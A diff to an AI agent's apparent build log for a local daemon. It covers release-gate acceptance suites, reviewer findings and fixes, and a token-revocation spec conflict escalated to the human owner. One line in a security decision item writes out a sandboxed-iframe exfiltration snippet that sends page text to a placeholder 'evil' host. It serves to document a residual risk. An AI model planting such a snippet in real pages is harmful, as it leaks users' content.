@@ -626,6 +626,68 @@ debate.
 - **Tests:** 1012 pass / 0 fail (2× confirmed), typecheck clean.
 - **Phase 5 remaining: P5.2 (acceptance suites, the release gate — LAST, CC:yes).** ⛔ P5.3/P5.4 = Dawid.
 
+### P5.2 deterministic acceptance suites — ✅ — CC: yes — **the release gate, LAST buildable task**
+- **Built (solo, no delegation for the audit itself):** rather than writing seven suites from scratch,
+  audited T8's seven mandatory categories (requirements.md, verbatim) against this build's existing
+  70+ test files from 18 prior tasks, verified each claim by reading actual test bodies (not filenames),
+  and built only genuine gaps. Full index: `test/acceptance/T8-GATE.md` — the one place to answer
+  "is the release gate green" without re-deriving coverage from memory.
+- **Per category:** (1) storage/fault — journal/inbox/shadow-git/workspace-index ALREADY SATISFIED;
+  BUILT `bus/reconcile-fault-lease.test.ts` closing the one real gap (no prior fault sweep ever
+  truncated a journal containing a REAL apply-lease). (2) concurrency — in-process + daemon-boot
+  ALREADY SATISFIED; BUILT `concurrency-real-subprocess.test.ts` (genuine gap: nothing previously hit
+  a real daemon subprocess's HTTP API with genuinely concurrent socket requests against one
+  workspace's lease). (3) delivery — ALREADY SATISFIED, verified end-to-end not just capability-flag
+  checks. (4) browser security — BUILT `test/acceptance/security-attack-matrix.test.ts`, one
+  consolidated checklist mapping every A3 §5 numbered attack to a passing test against REAL production
+  functions. (5) anchor corpus — ALREADY SATISFIED, verified directly (41-case totality fuzz, full
+  markup/duplicate/stale/class-F matrices, not just trusting P3.4's own claim). (6) transcript suite
+  — ALREADY SATISFIED, verified directly against all 4 named fault modes. (7) adapter-topology (per
+  D10, reinterpreted from "actual jethro topology" since jethro is out of this repo) — BUILT
+  `adapters/adapter-topology.test.ts`, extending the shared P6.1 fixture adapter with an opt-in
+  `sessionBindingFor`, proving session routing through the REAL `POST /api/sessions/register` route
+  when a session's cwd doesn't match the adapter's recognized workspace.
+- **Three-way adversarial pass (critic + security-auditor + concurrency-expert, parallel) — no
+  CRITICAL/production bugs found; the underlying mutex/lease mechanics are sound. Findings, all
+  resolved:**
+  - **Test-rigor gap (concurrency-expert):** the "two different workspace roots, no contention" test
+    asserted only that both concurrent requests succeeded — an assertion that would ALSO pass under
+    an accidentally-GLOBAL mutex (both roots would just serialize in time and still each succeed
+    within the test's timeout), so it couldn't actually distinguish correct per-root locking from a
+    broken global lock. **Fixed:** rewrote to a genuine timing-discriminating test — 15 concurrent
+    requests load workspace A's mutex slot, and workspace B's solo concurrent request must complete
+    within 4× (or 300ms floor) of an unloaded baseline; a global mutex would push B's latency toward
+    N× baseline instead. The underlying `KeyedMutex` itself was independently confirmed correctly
+    per-root-scoped by the reviewer via source inspection — this was purely a test-coverage gap, not
+    a production bug.
+  - **Test-rigor gap (concurrency-expert):** the new lease byte-sweep's `leaseSpanEnd` was anchored
+    to `apply_end`'s record start rather than `transition_committed`'s record end — meaning the
+    exhaustive truncation sweep never actually tore into the ONE record that flips status to
+    `"applied"`, despite the test's own docstring claiming full lease-span coverage. **Fixed:**
+    re-anchored to `transition_committed`, widened the span to include its own bytes, added an
+    explicit assertion that a truncation landing inside that record recovers to the PRE-transition
+    snapshot and `status: "applied"` never appears from a torn write.
+  - **Documentation gap (security-auditor):** attacks #1/#2 in the T8-GATE security table made an
+    unbrowsered CSP-header-string-match claim without the same "deferred to P5.4 manual rehearsal"
+    caveat attack #7 already carried, understating that all three make an equivalent class of
+    not-actually-browser-enforced claim. **Fixed:** added the matching caveat to #1/#2.
+  - **Escalated, NOT autonomously resolved (all three reviewers converged on this independently):**
+    A3-security.md names `glosa token rotate`/`glosa token revoke` as required for attack #8's full
+    defense; A6-cli-platform.md's canonical CLI command table doesn't list any `token` command at all
+    — a genuine, unresolved conflict between two normative appendices about whether token
+    rotation/revocation ships in v1. `packages/daemon/src/token.ts` has zero rotate/revoke
+    implementation anywhere (confirmed independently by two reviewers via grep). The security-auditor
+    traced the practical severity further: the token loads once at daemon BOOT into memory and SIGHUP
+    is wired as a no-op, so recovering from a leaked token today requires killing the daemon, manually
+    deleting the token file at an undocumented path, and re-running `glosa open` — there is no CLI
+    surface for any step of that. **I did not implement this myself** — inventing new security-
+    relevant surface (a token endpoint) unattended, this late in the build, on an unresolved spec
+    conflict, is exactly the kind of call that needs Dawid's judgment (implement vs. formally descope
+    v1 with a decisions.md entry), not an autonomous guess. Logged in "Blocked — needs Dawid" below.
+- **Tests:** 1038 pass / 0 fail (2× confirmed after fixes), typecheck clean.
+- **P5.2 done. Phase 5 done. ⛔ P5.3/P5.4 remain — Dawid-only, format-sermon companion diffs +
+  manual rehearsal. All BUILD-PLAN.md tasks that can be built unattended are now ✅.**
+
 ### D9 — annotation `artifact_path` is additive, not a wire-shape rewrite (P6.1)
 A1 §5.6 / R3's annotation payload has no field naming which artifact it targets — genuinely missing from
 the spec, not an oversight in a prior task (`POST /w/:slug/annotations` is workspace-, not artifact-,
@@ -720,6 +782,27 @@ jethro's internals, only the shape jethro must hand back.
   outside the repo. Will prepare proposed diffs as a doc, not apply.
 - **P5.4 manual rehearsal (T8)** — pre-marked ⛔; needs a live Claude session + Dawid's eyes.
 
+- **⚠ SPEC-CONFLICT DECISION — token rotate/revoke (surfaced by P5.2's three-reviewer pass; needs
+  Dawid).** `docs/appendices/A3-security.md` names `glosa token rotate`/`glosa token revoke` as
+  required for attack #8's full defense ("revoke → old Bearer 401"). `docs/appendices/A6-cli-platform.md`'s
+  own canonical "Full command surface" table doesn't list a `token` command at all. Neither
+  `requirements.md` nor `decisions.md` resolves the disagreement. `packages/daemon/src/token.ts` has
+  zero rotate/revoke logic (confirmed independently by two reviewers via grep) — this is a real,
+  unimplemented gap, not just an untested one. Practical severity, traced by the security-auditor:
+  the daemon loads its token once at BOOT into memory and `SIGHUP` is a no-op, so recovering from a
+  leaked/exfiltrated Bearer token today requires killing the daemon, manually deleting the token file
+  at an undocumented path, then re-running `glosa open` — no CLI surface exists for any step. All
+  three independent reviewers (critic, security-auditor, concurrency-expert's report didn't touch
+  this but the other two converged unprompted) flagged this as something a report shouldn't silently
+  resolve as "non-blocking." **Decision needed from Dawid:** (a) implement a `glosa token
+  rotate`/`revoke` command (mint a fresh token + a live-reload signal the running daemon can pick up
+  without a full restart) as a near-term v1.x follow-up, or (b) formally descope it from v1 with a
+  `decisions.md` entry narrowing A3 §5 attack #8's stated defense to match what's actually shipping.
+  Given the local-first/loopback-only/single-user threat model and that CSP+sandbox+nonce (attacks
+  #1-3) are what actually stand between a hostile page and token exfiltration in the first place,
+  recommend (a) as a fast follow rather than blocking v1 on it — but this is Dawid's call, not mine to
+  make unattended this late in the build.
+
 - **⚠ SECURITY DECISION — class-F self-navigation egress (surfaced in P4.1 review; needs Dawid).** The
   class-F CSP + sandbox genuinely close fetch/XHR/WebSocket/img/form egress (tested), BUT a sandboxed
   `allow-scripts` iframe can always navigate ITSELF (`location.href="https://evil/leak?"+pageText`, an
@@ -740,4 +823,51 @@ jethro's internals, only the shape jethro must hand back.
 
 ## SUMMARY
 
-<!-- filled when the goal clears -->
+**Every buildable BUILD-PLAN.md task is done.** All of Phases 1–6 (P1.1 through P6.1, 20 tasks
+including P4.5-superseded-by-P6.1) are ✅ — built, adversarially reviewed where marked CC:yes, tested
+with real fault/edge cases (not happy-path theater), and committed straight to `main`. P5.3 (format-
+sermon companion diffs) and P5.4 (the manual rehearsal) remain ⛔ exactly as pre-marked — both need
+Dawid's own eyes/session and were correctly never attempted unattended.
+
+**What's built:** the full daemon (singleton lifecycle, journal-as-truth file bus, shadow-git
+provenance, session/workspace registry, guarded lifecycle state machine, the complete HTTP API, SSE
+streaming, class-R/class-F viewers with 3 edit modes, the anchoring resolver, diff/history/restore),
+both agent-provider integrations (Claude Code channels+asyncRewake, Codex gate+mcp-pull), the generic
+adapter-registration protocol (proven only against a neutral fixture, zero jethro code in this repo),
+the full CLI command surface, and the T8 deterministic release-gate suite itself (`test/acceptance/
+T8-GATE.md`).
+
+**Test status:** 1038 pass / 0 fail, `bun run typecheck` clean, confirmed repeatedly through the
+night. One known flake class recurs under system load (a subprocess-timing daemon-lock test,
+`bootDaemon — ... stale lock ...`) — always clears on retry, never a real regression; not a second
+one has surfaced beyond the two already-logged flake signatures.
+
+**Coordination note:** this build spanned at least two sessions with a genuine handoff-overlap
+incident (see the P6.1 entry's handoff note) — a prior session's `/goal` Stop-hook kept it alive
+briefly after spawning its successor, risking two orchestrators on one repo. It was caught by the
+outgoing session itself before any file corruption occurred, resolved via `/goal clear`, and logged
+here for the record. No work was lost or duplicated.
+
+**Every CC:yes task got a genuine adversarial pass** (2-3 independent reviewers: critic + a domain
+specialist — security-auditor and/or concurrency-expert depending on the task), and those passes
+found REAL bugs across the night: provenance-forgery and false-attribution bugs (P2.3), a lifecycle
+guard blocker that would have hung `--wait` forever (P2.5), route-enumeration and dev-overlay
+info-leak holes (P1.3/P3.1), an unhandled-adapter-throw DoS path and a too-strict manifest gate that
+would have silently broken the real chunk-manifest feature (P6.1, caught and corrected before
+landing), a `reconcileOnce` failure-poisoning bug and an honest-transition gap (P5.1), and two
+test-rigor gaps in the release gate's own new suites (P5.2) — a strong argument, if one were needed,
+for treating "green CI" and "adversarially reviewed" as different bars.
+
+**Left for Dawid (2 items, both logged in "Blocked — needs Dawid" above):**
+1. **Class-F self-navigation egress residual** (P4.1) — a platform-level HTML sandbox limit CSP
+   can't fully close; recommend accepting as a documented residual given class-F content is the
+   user's own jethro output, not adversary-supplied.
+2. **Token rotate/revoke spec conflict** (P5.2) — A3 requires it, A6's command table omits it,
+   nothing implements it; recommend implementing as a fast v1.x follow-up rather than blocking v1,
+   but this is Dawid's call.
+
+**Recommended next steps:** (a) rule on the two items above; (b) run P5.4's manual rehearsal against
+a copy of `po-co-to-wszystko` per requirements.md's T8 spec — this is the actual "is v1 done" gate,
+not tonight's green test suite; (c) review P5.3's format-sermon companion-diff proposal (not yet
+drafted — flag if you want it prepared before the rehearsal); (d) file the jethro-repo handoff issue
+described in the P6.1 entry's "HANDOFF — jethro-side content adapter" section.
